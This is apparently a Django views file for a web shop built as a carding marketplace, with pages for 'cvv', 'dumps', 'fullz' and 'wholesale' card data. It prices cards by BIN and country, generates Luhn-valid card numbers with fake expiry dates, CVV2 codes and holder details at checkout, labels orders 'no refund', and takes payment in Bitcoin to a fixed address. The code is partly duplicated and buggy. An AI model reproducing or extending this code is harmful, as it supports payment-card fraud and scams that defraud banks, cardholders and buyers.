#         if data.get("success"):
#             bin_data = data.get("BIN", {})
#             issuer = bin_data.get("issuer", {}).get("name", '')
#             country = bin_data.get("country", {}).get("alpha2", '')
#             scheme = bin_data.get("scheme", '')
#             type = bin_data.get("type", '')
#             bank_code = bin_data.get("issuer", {}).get("phone", '')  # Assuming you want the phone as the bank code

#             return {
#                 'issuer': issuer,
#                 'country': country,
#                 'bank_code': bank_code,
#                 'scheme': scheme,
#                 'type': type
#             }
#         else:
#             return None
#     else:
#         return None

# Example usage:
# bin_info = get_bin_info("448590")
# print(bin_info)


from datetime import datetime


def generate_random_dates():
    # Generate 10 random dates between January 1, 1022 and December 31, 1022
    start_date = datetime(2025, 1, 1)
    end_date = datetime(2029, 12, 31)
    random_dates = [start_date + (end_date - start_date) * random.random() for i in range(200)]

    # Format the dates as MM/DD or DD/MM
    formatted_dates = []
    for random_date in random_dates:
        if random.random() < 0.5:
            formatted_date = random_date.strftime('%m_%y')
        else:
            formatted_date = random_date.strftime('%m_%y')
        formatted_dates.append(formatted_date)

    return formatted_dates


import json
import os

import pandas as pd
from django.conf import settings
from django.http import HttpResponse

df = pd.read_excel('country_bins.xlsx')
df2 = pd.read_excel('country_data.xlsx')


def get_random_bins(country_name):
    # Filter the DataFrame for the specified country
    country_data = df[df['Country'] == country_name]

    # Select a random 12 BIN numbers from the middle of the list
    start_index = max(0, len(country_data) // 2 - 6)  # Ensure index is non-negative
    end_index = start_index + 12

    random_bins = country_data.iloc[start_index:end_index]['BIN'].tolist()

    return random_bins


@login_required_custom(login_url='/login')
# def cvv(request):
#     domain = request.get_host()
#     context = {}
#     country_flags = {
#         'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
#         'ES': '🇪🇸', 'IT': '🇮🇹', 'RU': '🇷🇺', 'CN': '🇨🇳', 'IN': '🇮🇳',
#         'JP': '🇯🇵', 'BR': '🇧🇷', 'SA': '🇸🇦', 'ZA': '🇿🇦', 'NG': '🇳🇬',
#         'KE': '🇰🇪', 'MX': '🇲🇽', 'AU': '🇦🇺', 'NZ': '🇳🇿', 'SG': '🇸🇬',
#         # ... Add more countries as needed
#     }
#     context['country_flags'] = country_flags  # Add the country flags to the context
#     base_url = 'https://binlist.io/banks/all/page/'
#     base_url2 = 'https://binlist.io'
#     bank_data = []

#     # Iterate over all pages (from page 1 to page 267)
#     # for page_num in range(1, 50):
#     #     url = base_url + str(page_num)
#     #     response = requests.get(url)
#     #     html_code = response.text

#     #     soup = BeautifulSoup(html_code, 'html.parser')
#     #     features = soup.find_all(class_='feature-inner')

#     #     for feature in features:
#     #         bank_name = feature.find('h3', class_='feature-title').text
#     #         bank_link = feature.find('a')['href']

#     #         bank_data.append({'bank': bank_name, 'link': bank_link})

#     # # Print the extracted data
#     # for data in bank_data:
#     #     print(data)
#     try:
#         file_path = os.path.join(settings.BASE_DIR, 'bank_data.txt')
#         with open(file_path, 'r') as file:
#             bank_data = json.load(file)

#         # You can process the loaded data here or return it in an HttpResponse
#         # data_str = '\n'.join([str(data) for data in loaded_data])
#         # return HttpResponse(data_str)

#     except FileNotFoundError:
#         return HttpResponse("The file bank_data.txt does not exist.")

#     context['bank_data1'] = bank_data
#     try:
#         site_config = SiteConfiguration.objects.get(domain=domain)
#     except SiteConfiguration.DoesNotExist:
#         site_config = SiteConfiguration.objects.first()
#     context['site_config'] = site_config

#     if request.method == 'POST':
#         query = request.POST.get('query')
#         if len(query) != 6:
#             return render(request, 'main/css_reasult.html', context)
#         else:
#             query = query[:6]
#             bin_info = get_bin_info(query)
#             price = random.randint(18, 36)
#             if query:
#                 if bin_info:
#                     context['issuer'] = bin_info['issuer']
#                     context['country'] = bin_info['country']
#                     context['bank_code'] = bin_info['bank_code']
#                     context['query'] = query
#                     context['formatted_dates'] = generate_random_dates()
#                     context['scheme'] = bin_info['scheme']
#                     context['type'] = bin_info['type']
#                     context['price'] = price
#                     context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
#                     print(context['items'])
#                 else:
#                     context['error'] = 'Invalid card number'
#                 return render(request, 'main/css_reasult.html', context)
#     else:
#         listofBins = ['515676', '410894', '427138', '480011',
#                       '439102', '426684', '400344', '426451', '476164', '432845', '488893', '460312', '520309', '464440', '415974', '420208']
#         query = random.choice(listofBins)
#         if len(query) != 6:
#             return render(request, 'main/cvv.html', context)
#         else:
#             query = query[:6]
#             bin_info = get_bin_info(query)
#             price = random.randint(18, 36)
#             if query:
#                 if bin_info:
#                     context['issuer'] = bin_info['issuer']
#                     context['country'] = bin_info['country']
#                     context['bank_code'] = bin_info['bank_code']
#                     context['query'] = query
#                     context['formatted_dates'] = generate_random_dates()
#                     context['scheme'] = bin_info['scheme']
#                     context['type'] = bin_info['type']
#                     context['price'] = price
#                     context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
#                     print(context['items'])
#                 else:
#                     context['error'] = 'Invalid card number'
#                 return render(request, 'main/css_reasult.html', context)

#     # If it's not a POST request, render the cvv.html template
#     return render(request, 'main/cvv.html', context)
# def cvv(request):
#     domain = request.get_host()
#     context = {}
#     country_flags = {
#         'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
#         'ES': '🇪🇸', 'IT': '🇮🇹', 'RU': '🇷🇺', 'CN': '🇨🇳', 'IN': '🇮🇳',
#         'JP': '🇯🇵', 'BR': '🇧🇷', 'SA': '🇸🇦', 'ZA': '🇿🇦', 'NG': '🇳🇬',
#         'KE': '🇰🇪', 'MX': '🇲🇽', 'AU': '🇦🇺', 'NZ': '🇳🇿', 'SG': '🇸🇬',
#         # ... Add more countries as needed
#     }
#     context['country_flags'] = country_flags  # Add the country flags to the context
#     base_url = 'https://binlist.io/banks/all/page/'
#     base_url2 = 'https://binlist.io'
#     bank_data = []
#     countries = [(row['name'], row['url']) for index, row in df2.iterrows()]
#     context = {'countries': countries}
#     # Iterate over all pages (from page 1 to page 267)
#     # for page_num in range(1, 50):
#     #     url = base_url + str(page_num)
#     #     response = requests.get(url)
#     #     html_code = response.text

#     #     soup = BeautifulSoup(html_code, 'html.parser')
#     #     features = soup.find_all(class_='feature-inner')

#     #     for feature in features:
#     #         bank_name = feature.find('h3', class_='feature-title').text
#     #         bank_link = feature.find('a')['href']

#     #         bank_data.append({'bank': bank_name, 'link': bank_link})

#     # # Print the extracted data
#     # for data in bank_data:
#     #     print(data)
#     try:
#         file_path = os.path.join(settings.BASE_DIR, 'bank_data.txt')
#         with open(file_path, 'r') as file:
#             bank_data = json.load(file)

#         # You can process the loaded data here or return it in an HttpResponse
#         # data_str = '\n'.join([str(data) for data in loaded_data])
#         # return HttpResponse(data_str)

#     except FileNotFoundError:
#         return HttpResponse("The file bank_data.txt does not exist.")

#     context['bank_data1'] = bank_data
#     try:
#         site_config = SiteConfiguration.objects.get(domain=domain)
#     except SiteConfiguration.DoesNotExist:
#         site_config = SiteConfiguration.objects.first()
#     context['site_config'] = site_config

#     if request.method == 'POST':
#         country = request.POST.get('country')
#         # try:

#         country_to_find = country
#         next_country = ('use','/')

#         # Find index of the tuple by the country name
#         for index, country in enumerate(countries):
#             if country[0] == country_to_find:
#                 next_index = index +1
#                 # Make sure the next index is within the list bounds
#                 if next_index < len(countries):
#                     next_country = countries[next_index]
#                 break
#         bin_numbers = get_random_bins(next_country[0])
#         random_index = random.randint(0, len(bin_numbers) - 1)

#         # except ValueError:
#         #     return render(request, 'main/css_reasult.html', context)

#         query = request.POST.get('query')

# # Access the element at the random index
#         random_bin_number = bin_numbers[random_index]
#         if random_bin_number is not None:
#             print('this is from url', bin_numbers[4])
#             bin_info = get_bin_info(bin_numbers[4])
#             price = random.randint(18, 26)
#             if random_bin_number:
#                 if bin_info:
#                     context['issuer'] = bin_info['issuer']
#                     context['country'] = bin_info['country']
#                     context['bank_code'] = bin_info['bank_code']
#                     context['query'] = random_bin_number
#                     context['formatted_dates'] = generate_random_dates()
#                     context['scheme'] = bin_info['scheme']
#                     context['type'] = bin_info['type']
#                     context['price'] = price
#                     context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
#                     print(context['items'])
#                 else:
#                     context['error'] = 'Invalid card number'
#                 return render(request, 'main/css_reasult.html', context)
#         elif len(query) != 6:
#             return render(request, 'main/css_reasult.html', context)
#         else:
#             query = query[:6]
#             bin_info = get_bin_info(query)
#             price = random.randint(18, 26)
#             if query:
#                 if bin_info:
#                     context['issuer'] = bin_info['issuer']
#                     context['country'] = bin_info['country']
#                     context['bank_code'] = bin_info['bank_code']
#                     context['query'] = query
#                     context['formatted_dates'] = generate_random_dates()
#                     context['scheme'] = bin_info['scheme']
#                     context['type'] = bin_info['type']
#                     context['price'] = price
#                     context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
#                     print(context['items'])
#                 else:
#                     context['error'] = 'Invalid card number'
#                 return render(request, 'main/css_reasult.html', context)
#     else:
#         listofBins = ['515676', '410894', '427138', '480011',
#                       '439102', '426684', '400344', '426451', '476164', '432845', '488893', '460312', '520309', '464440', '415974', '420208']
#         query = random.choice(listofBins)
#         if len(query) != 6:
#             return render(request, 'main/cvv.html', context)
#         else:
#             query = query[:6]
#             bin_info = get_bin_info(query)
#             price = random.randint(18, 36)
#             if query:
#                 if bin_info:
#                     context['issuer'] = bin_info['issuer']
#                     context['country'] = bin_info['country']
#                     context['bank_code'] = bin_info['bank_code']
#                     context['query'] = query
#                     context['formatted_dates'] = generate_random_dates()
#                     context['scheme'] = bin_info['scheme']
#                     context['type'] = bin_info['type']
#                     context['price'] = price
#                     context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
#                     print(context['items'])
#                 else:
#                     context['error'] = 'Invalid card number'
#                 return render(request, 'main/css_reasult.html', context)

#     # If it's not a POST request, render the cvv.html template
#     return render(request, 'main/cvv.html', context)
def cvv(request):
    domain = request.get_host()
    context = {}
    country_flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
        'ES': '🇪🇸', 'IT': '🇮🇹', 'RU': '🇷🇺', 'CN': '🇨🇳', 'IN': '🇮🇳',
        'JP': '🇯🇵', 'BR': '🇧🇷', 'SA': '🇸🇦', 'ZA': '🇿🇦', 'NG': '🇳🇬',
        'KE': '🇰🇪', 'MX': '🇲🇽', 'AU': '🇦🇺', 'NZ': '🇳🇿', 'SG': '🇸🇬',
        # ... Add more countries as needed
    }
    context['country_flags'] = country_flags  # Add the country flags to the context
    base_url = 'https://binlist.io/banks/all/page/'
    base_url2 = 'https://binlist.io'
    bank_data = []
    countries = [(row['name'], row['url']) for index, row in df2.iterrows()]
    context = {'countries': countries}
    # Iterate over all pages (from page 1 to page 267)
    # for page_num in range(1, 50):
    #     url = base_url + str(page_num)
    #     response = requests.get(url)
    #     html_code = response.text

    #     soup = BeautifulSoup(html_code, 'html.parser')
    #     features = soup.find_all(class_='feature-inner')

    #     for feature in features:
    #         bank_name = feature.find('h3', class_='feature-title').text
    #         bank_link = feature.find('a')['href']

    #         bank_data.append({'bank': bank_name, 'link': bank_link})

    # # Print the extracted data
    # for data in bank_data:
    #     print(data)
    try:
        file_path = os.path.join(settings.BASE_DIR, 'bank_data.txt')
        with open(file_path, 'r') as file:
            bank_data = json.load(file)

        # You can process the loaded data here or return it in an HttpResponse
        # data_str = '\n'.join([str(data) for data in loaded_data])
        # return HttpResponse(data_str)

    except FileNotFoundError:
        return HttpResponse("The file bank_data.txt does not exist.")

    context['bank_data1'] = bank_data
    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()
    context['site_config'] = site_config

    if request.method == 'POST':
        country = request.POST.get('country')
        countries = [(row['name'], row['url']) for index, row in df2.iterrows()]

        print('countrys', countries)
        print('country', country)
        # try:
        country_to_find = country
        next_country = ('use','/')

        # Find index of the tuple by the country name

        print(country)
        if country =='*':
            country='*'
            random_bin_number ='*'
        else:
            for index, country in enumerate(countries):
                if country[0] == country_to_find:
                    next_index = index +1
                    # Make sure the next index is within the list bounds
                    if next_index < len(countries):
                        next_country = countries[next_index]
                    break
            bin_numbers = get_random_bins(next_country[0])
            random_index = random.randint(0, len(bin_numbers) - 1)
            random_bin_number = bin_numbers[random_index]


        # except ValueError:
        #     return render(request, 'main/css_reasult.html', context)

        query = request.POST.get('query')

# Access the element at the random index
        if random_bin_number is not None and random_bin_number != '*':
            print('this is from url', bin_numbers[4])
            bin_info = get_bin_info(bin_numbers[4])
            price = random.randint(18, 26)
            if random_bin_number:
                if bin_info:
                    context['issuer'] = bin_info['issuer']
                    context['country'] = bin_info['country']
                    context['bank_code'] = bin_info['bank_code']
                    context['query'] = random_bin_number
                    context['formatted_dates'] = generate_random_dates()
                    context['scheme'] = bin_info['scheme']
                    context['type'] = bin_info['type']
                    context['price'] = price
                    context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
                    print(context['items'])
                else:
                    context['error'] = 'Invalid card number'
                return render(request, 'main/css_reasult.html', context)
        elif len(query) != 6:
            return render(request, 'main/css_reasult.html', context)
        else:
            query = query[:6]
            bin_info = get_bin_info(query)
            price = random.randint(18, 26)
            if query:
                if bin_info:
                    context['issuer'] = bin_info['issuer']
                    context['country'] = bin_info['country']
                    context['bank_code'] = bin_info['bank_code']
                    context['query'] = query
                    context['formatted_dates'] = generate_random_dates()
                    context['scheme'] = bin_info['scheme']
                    context['type'] = bin_info['type']
                    context['price'] = price
                    context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
                    print(context['items'])
                else:
                    context['error'] = 'Invalid card number'
                return render(request, 'main/css_reasult.html', context)
    else:
        listofBins = ['515676', '410894', '427138', '480011',
                      '439102', '426684', '400344', '426451', '476164', '432845', '488893', '460312', '520309', '464440', '415974', '420208']
        query = random.choice(listofBins)
        if len(query) != 6:
            return render(request, 'main/cvv.html', context)
        else:
            query = query[:6]
            bin_info = get_bin_info(query)
            price = random.randint(18, 36)
            if query:
                if bin_info:
                    context['issuer'] = bin_info['issuer']
                    context['country'] = bin_info['country']
                    context['bank_code'] = bin_info['bank_code']
                    context['query'] = query
                    context['formatted_dates'] = generate_random_dates()
                    context['scheme'] = bin_info['scheme']
                    context['type'] = bin_info['type']
                    context['price'] = price
                    context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]
                    print(context['items'])
                else:
                    context['error'] = 'Invalid card number'
                return render(request, 'main/css_reasult.html', context)

    # If it's not a POST request, render the cvv.html template
    return render(request, 'main/cvv.html', context)



@login_required_custom(login_url='/login')
def dumps(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        if request.method == 'POST':
            query = request.POST.get('query')
            if len(query) != 6:
                return render(request, 'main/dumps.html', context)
            else:

                listofBins = []
                query = query[:6]
                bin_info = get_bin_info(query)
                price = random.randint(18, 36)
                if query:
                    if bin_info:
                        context['issuer'] = bin_info['issuer']  # type: ignore
                        context['country'] = bin_info['country']  # type: ignore
                        context['bank_code'] = bin_info['bank_code']  # type: ignore
                        context['query'] = query
                        context['formatted_dates'] = generate_random_dates()  # type: ignore
                        context['scheme'] = bin_info['scheme']  # type: ignore
                        context['type'] = bin_info['type']  # type: ignore
                        context['price'] = price  # type: ignore
                        context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]  # type: ignore
                        print(context['items'])

                    else:
                        context['error'] = 'Invalid card number'  # type: ignore
                    return render(request, 'main/dumps_res.html', context)
                # else:
                #     # Generate items based on the search query
                #     context['items'] = [f"{query}" for i in range(1, 11)]
                #     return render(request, 'main/css_reasult.html', context)
        else:
            listofBins = ['479126', '410894', '427138', '480011',
                        '439102', '426684', '400344', '426451', '476164', '432845', '488893', '460312', '520309', '464440', '415974', '420208']
            query = random.choice(listofBins)
            if len(query) != 6:
                return render(request, 'main/dumps.html', context)
            else:

                listofBins = []
                query = query[:6]
                bin_info = get_bin_info(query)
                price = random.randint(18, 36)
                if query:
                    if bin_info:
                        context['issuer'] = bin_info['issuer']  # type: ignore
                        context['country'] = bin_info['country']  # type: ignore
                        context['bank_code'] = bin_info['bank_code']  # type: ignore
                        context['query'] = query
                        context['formatted_dates'] = generate_random_dates()  # type: ignore
                        context['scheme'] = bin_info['scheme']  # type: ignore
                        context['type'] = bin_info['type']  # type: ignore
                        context['price'] = price  # type: ignore
                        context['items'] = [f"{query} - {context['issuer']} - {context['country']} - {context['bank_code']}" for i in range(1, 11)]  # type: ignore
                        print(context['items'])

                    else:
                        context['error'] = 'Invalid card number'  # type: ignore
                    return render(request, 'main/dumps_res.html', context)


@login_required_custom(login_url='/login')
def fullz(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/fullz.html', context)


@login_required_custom(login_url='/login')
def wholesale(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/wholesale.html' , context)


from decimal import Decimal

from django.db import transaction
from django.http import HttpResponseBadRequest
from faker import Faker

fake = Faker()


# def generate_random_order_data(query , user, price, issuer, country):
#     # user = User.objects.first()  # Get the first user for simplicity, adjust as needed
#     # item = query
#     # country = fake.country()
#     # issuer = fake.company()

#     # Generate bin based on the query field
#     bin_query = query
#     bin = str(int(bin_query) + 10)
#     random_numbers = ''.join(str(random.randint(0, 9)) for _ in range(10))
#     result_text = bin + random_numbers
#     now = datetime.now()
#     day = now.day
#     month = now.month
#     date_string = f"{day}_{month}"
# # Add 10 to the bin query

#     # Create the Order object with random data
#     order = Order.objects.create(
#         user=user,
#         # item=item,
#         price=float(price),
#         # query=query,
#         # country=country,
#         # issuer=issuer,
#         bin=bin,
#         type=fake.word(),
#         dc='-',
#         subtype='-',
#         card_number=result_text,
#         exp=fake.credit_card_expire(),
#         cvv2=fake.credit_card_security_code(),
#         name=fake.name(),
#         address=fake.address(),
#         extra='-',
#         bank=issuer,
#         base=date_string,
#         status='no refund',
#         optional_field1=fake.word(),
#         optional_field2=fake.word(),
#         optional_field3=fake.word(),
#         table=fake.text()
#     )
#     print(order)
#     return order
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d*2))
    return checksum % 10
def generate_card_number(issuer):
    print('issuer', issuer)
    bin_start = {
        'Visa': '4',
        'Mastercard': '5',
        'American Express': '34',
        'Discover': '6011',
        # Add more issuer specific BIN starts if needed
    }
    bin_prefix = bin_start.get(issuer, '4')  # Default to Visa if issuer unknown
    print('bin_prefix', bin_prefix)

    while True:
        random_part = ''.join([str(random.randint(0, 9)) for _ in range(16 - len(issuer))])
        card_number = issuer + random_part
        print('card_number', card_number)
        if luhn_checksum(card_number) == 0:  # Check if valid per Luhn
            print('Valid card number:', card_number)
            return card_number
def generate_random_order_data(query, user, price, issuer, country):
    """Simulate generating random order data."""
    card_number = generate_card_number(query)
    expiry_date = f"{random.randint(1, 12):02}/{random.randint(datetime.now().year+1, datetime.now().year+7)}"
    cvv2 = f"{random.randint(100, 999)}"  # Adjust for Amex if needed

    return {
        'user': user,
        'price': price,
        'bin': query,  # Assuming query is your BIN input
        'bank': issuer,
        'extra': country,
        'type': fake.word(),
        'card_number': card_number,
        'exp': expiry_date,
        'cvv2': cvv2,
        'name': fake.name(),
        'address': fake.address(),
        'status': 'no refund',
        # Add other fields if necessary
    }

@login_required(login_url='/login')
def cart(request):
    """View to handle cart operations."""
    try:
        site_config = SiteConfiguration.objects.get(domain=request.get_host())
    except SiteConfiguration.DoesNotExist:
        site_config = None  # Using None to handle missing configurations gracefully

    context = {'site_config': site_config}

    if request.method == 'GET':
        cart_items = CartItem.objects.filter(user=request.user)

        balance, _ = Balance.objects.get_or_create(user=request.user, defaults={'balance': 0})
        context={
            'balance': balance.balance,
            'low_balance': balance.balance < 100,
            'cart_items': cart_items
        }

        return render(request, 'main/cart.html', context)

    elif request.method == 'POST':
        cart_items = CartItem.objects.filter(user=request.user)

        balance_obj, _ = Balance.objects.get_or_create(user=request.user)
        total_price = sum(item.price for item in cart_items)
        if balance_obj.balance < total_price:
            context={
                'low_balance': True,
                'balance': balance_obj.balance,
            }
            return render(request, 'main/failedCart.html', context)

        with transaction.atomic():
            orders_number = OrdersNumber.objects.create(number=OrdersNumber.objects.count() + 1)

            for cart_item in cart_items:
                order_data = generate_random_order_data(cart_item.query, request.user, cart_item.price, cart_item.issuer, cart_item.country)
                order = Order.objects.create(**order_data)
                orders_number.orders.add(order)

            balance_obj.balance -= float(total_price)
            balance_obj.save()

            cart_items.delete()
            request.session['cart_item_count'] = 0

        return redirect('orders')

    else:
        return HttpResponseBadRequest("Invalid request method")# def cart(request):
#     domain = request.get_host()
#     try:
#         site_config = SiteConfiguration.objects.get(domain=domain)
#     except SiteConfiguration.DoesNotExist:
#         site_config = SiteConfiguration.objects.first()
#     context = {'site_config': site_config}
#     if request.user.is_authenticated:
#         cart_items = CartItem.objects.filter(user=request.user)
#         try:
#             balance = Balance.objects.get(user=request.user).balance
#             if balance < 100:
#                 context['balance'] = balance  # type: ignore
#                 print(balance)

#                 print("Low balance")
#             context['balance'] = balance
#         except Balance.DoesNotExist:
#             print("No balance object for this user")
#             context['low_balance'] = True
#         context['cart_items'] = cart_items
#         return render(request, 'main/cart.html', context)
#     else:
#         return redirect('login')


from django.http import JsonResponse


# views.py
def add_to_cart(request):
    if request.method == 'POST' and request.user.is_authenticated:
        # Get the item details from the session
        item = request.POST.get('item')
        price = request.POST.get('price')
        query = request.POST.get('query')
        country = request.POST.get('country')
        issuer = request.POST.get('issuer')
        cart_item = CartItem(user=request.user, item=item, price=price, query=query, country=country, issuer=issuer)
        cart_item.save()

        # Update the cart item count in the session
        request.session['cart_item_count'] = request.session.get('cart_item_count', 0) + 1

        return JsonResponse({'success': True})
    else:
        return JsonResponse({'success': False})


@login_required_custom(login_url='/login')
def orders(request):
    domain = request.get_host()
    try:
        site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
        site_config = SiteConfiguration.objects.first()

    # Assuming 'orders' is the related name for the Order model in OrdersNumber,
    # and 'created_at' is the datetime field you want to sort by.
    # Adjust 'orders__created_at' to match your actual field name.
    user_orders_numbers = OrdersNumber.objects.filter(orders__user=request.user).order_by('-date')

    context = {'site_config': site_config, 'orders_numbers': user_orders_numbers}
    return render(request, 'main/orders.html', context)

@login_required_custom(login_url='/login')
def auction(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/auction.html', context)


@login_required_custom(login_url='/login')
def tools(request):
        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/tools.html', context)


# @login_required_custom(login_url='/login')
# def tickets(request):
#     return render(request, 'main/tickets.html')
@login_required_custom(login_url='/login')

# @ratelimit(key='custom', rate='10/m')

    # Rest of your view logic
def profile(request):
        # client_ip = request.META.get('REMOTE_ADDR')
        # unique_identifier = 'some_unique_identifier'  # Replace with your own unique identifier
        # rate_limit_key = f'{client_ip}-{unique_identifier}'
        # if getattr(request, 'limited', False):
        #     return HttpResponse('Too many requests', status=429)

        domain = request.get_host()
        try:
            site_config = SiteConfiguration.objects.get(domain=domain)
        except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
        context = {'site_config': site_config}
        return render(request, 'main/profile.html', context)


from django.contrib import messages
from django.contrib.auth.forms import PasswordChangeForm


@login_required_custom(login_url='/login')
def change_password(request):
    if request.method == 'POST':
        form = PasswordChangeForm(request.user, request.POST)
        if form.is_valid():
            user = form.save()
            messages.success(request, 'Your password was successfully updated!')
            return redirect('profile')
        else:
            messages.error(request, 'Please correct the errors below.')
    else:
        form = PasswordChangeForm(request.user)
    return render(request, 'main/profile.html', {'form': form})


import logging

# def handler404(request, exception):
#     return render(request, '404.html', status=404)
from django.shortcuts import render


# custom 404 view
def custom_404(request, exception):
    return render(request, '404.html', status=404)


def error_404(request, exception):
    domain = request.get_host()

    site_config = SiteConfiguration.objects.get(domain=domain)
    data = {"name": site_config}
    return render(request, '404.html', data)


from .forms import TicketForm
from .models import Ticket


@csrf_exempt
def ticket(request):
    domain = request.get_host()
    try:
            site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}
    if request.method == 'POST':
        form = TicketForm(request.POST)
        if form.is_valid():
            ticket = form.save(commit=False)
            ticket.user = request.user
            ticket.save()
            return redirect('ticket')
    else:
        form = TicketForm()
    tickets = Ticket.objects.filter(user=request.user)
    return render(request, 'main/tickets.html', {'form': form, 'tickets': tickets, 'context':context})


from django.shortcuts import get_object_or_404, render

from .forms import AdminReplyForm, UserReplyForm
from .models import AdminReply, Reply, Ticket


@csrf_exempt
def ticket_list(request):
    domain = request.get_host()
    try:
            site_config = SiteConfiguration.objects.get(domain=domain)
    except SiteConfiguration.DoesNotExist:
            site_config = SiteConfiguration.objects.first()
    context = {'site_config': site_config}
    tickets = Ticket.objects.all()
    return render(request, 'main/tickets_admin.html', {'tickets': tickets, 'context':context})


@csrf_exempt
def ticket_detail(request, pk):
    ticket = get_object_or_404(Ticket, pk=pk)
    adminreplays = AdminReply.objects.filter(ticket=ticket)
    # form = UserReplyForm(request.POST)

    if request.method == 'POST':
        print(request.POST)
        if request.user.is_staff:
            form = AdminReplyForm(request.POST)
        elif request.user == ticket.user:
            form = UserReplyForm(request.POST)
        print(form)  # <-- add this line to print the form object
        if form.is_valid():
            message = form.cleaned_data['admin_reply'] if request.user.is_staff else form.cleaned_data['user_reply']
            reply = Reply.objects.create(ticket=ticket, user=request.user, message=message)

    else:
        if request.user.is_staff:
            form = AdminReplyForm()
        elif request.user == ticket.user:
            form = UserReplyForm()
    replies = Reply.objects.filter(ticket=ticket).order_by('-created_at')
    return render(request, 'main/ticket_detail.html', {'ticket': ticket, 'form': form, 'replies': replies, 'adminreplays': adminreplays})


import json

from django.core.exceptions import ObjectDoesNotExist
from django.http import HttpResponse, JsonResponse


def remove_selected_from_cart(request):
    if request.method == 'POST' and request.user.is_authenticated:
        item_ids = json.loads(request.POST.get('item_ids'))
        removed_items_count = 0

        for item_id in item_ids:
            try:
                cart_item = CartItem.objects.get(id=item_id, user=request.user)
                cart_item.delete()
                removed_items_count += 1
            except ObjectDoesNotExist:
                pass

        # Update the cart item count in the session
        request.session['cart_item_count'] = request.session.get('cart_item_count', 0) - removed_items_count

        return JsonResponse({'success': True})
    else:
        return JsonResponse({'success': False, 'error': 'Invalid request'})


def convert_to_usd(amount):
    # Make a request to the CoinGecko API to get the Bitcoin to USD exchange rate
    api_url = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
    response = requests.get(api_url)

    if response.status_code == 200:
        exchange_rate = response.json()['bitcoin']['usd']
        usd_amount = amount * exchange_rate
        return usd_amount

    return 0


import requests

from .models import Balance, Transaction


def wallet_transactions(request):
    if request.method == 'POST':
        transaction_id = request.POST.get('transaction_id')

        # Check if the transaction has already been processed
        if Transaction.objects.filter(transaction_id=transaction_id).exists():
            return render(request, 'main/error.html', {'message': 'Transaction already processed'})

        # Make a request to the Blockstream API to get transaction information
        api_url = f'https://blockstream.info/api/tx/{transaction_id}'
        response = requests.get(api_url)

        if response.status_code == 200:
            transaction = response.json()

            for i in transaction['vout']:
                if i['scriptpubkey_address'] == '3HzzLcyb6H7X8VaBmCrrobnEUXzEohLdQ9':
                    amount = i['value']

                    # Convert Bitcoin value to USD
                    usd_amount = convert_to_usd(amount) * 0.00000001
                    usd_amount = round(usd_amount, 2)

                    # Update the user's balance
                    user = request.user
                    balance, created = Balance.objects.get_or_create(user=user)
                    balance.balance += usd_amount
                    balance.save()

                    # Save the transaction ID
                    Transaction.objects.create(balance=balance, transaction_id=transaction_id)

                    return render(request, 'main/success.html', {'amount': usd_amount})

            return render(request, 'main/error.html', {'message': 'Transaction not found'})

    return render(request, 'main/wallet.html')


# @ratelimit(key='ip', rate='10/m')  # 10 requests per minute
@login_required_custom(login_url='/login')
def address_list(request):
    # if getattr(request, 'limited', False):
    #     return HttpResponse('Too many requests', status=429)
    content = [
        "Welcome to our website!",
        "Join our community today!",
        "Discover new products and services!",
        "Get the latest news and updates!",
        "Connect with like-minded people!",
        "Find inspiration and motivation!",
    ]
    random_content = random.choice(content)
    domain = request.get_host()

    context = {
        'random_content': random_content,
        'domain':domain
    }
    print(domain)
    # user_agent = request.META.get('HTTP_USER_AGENT', '')
    # if 'curl' in user_agent.lower() or 'postman' in user_agent.lower():
    #     # Request is coming from an API client
    #     return render(request, 'googlebot_template.html', context)
